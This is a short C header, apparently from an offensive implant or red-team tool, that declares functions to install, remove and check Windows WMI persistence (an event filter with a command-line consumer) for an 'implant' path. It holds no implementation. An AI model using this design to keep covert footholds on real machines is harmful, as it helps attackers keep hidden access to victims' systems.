#pragma once
#include <windows.h>

// Install WMI persistence (CommandLineEventConsumer + EventFilter)
BOOL InstallWmiPersistence(const wchar_t* implantPath);

// Remove WMI persistence (cleanup)
BOOL RemoveWmiPersistence();

// Helper to check if already installed
BOOL IsWmiPersistenceInstalled();